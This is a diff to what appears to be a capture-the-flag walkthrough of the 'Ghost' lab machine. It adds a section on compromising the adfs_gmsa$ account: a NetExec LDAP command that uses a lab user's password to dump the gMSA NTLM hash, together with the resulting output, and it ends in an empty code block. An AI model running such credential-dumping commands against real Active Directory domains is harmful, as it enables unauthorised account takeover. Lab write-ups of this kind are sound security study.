@@ -849,4 +849,18 @@ I now have a shell!
 
 I can read the gMSA password for the `adfs_gmsa$` account
 
-# Compromising ``
+# Compromising `adfs_gmsa$`
+
+```python
+nxc ldap dc01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa
+LDAP        10.129.231.105  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.231.105  389    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 
+LDAP        10.129.231.105  389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.231.105  389    DC01             Account: adfs_gmsa$           NTLM: 55eea5db159b96bcb1d335d6e5738ea6     PrincipalsAllowedToReadPassword: ['DC01$', 'justin.bradley']
+```
+
+Ill just use `justin.bradley`'s access to read the NTLM hash for the user
+
+```python
+
+```
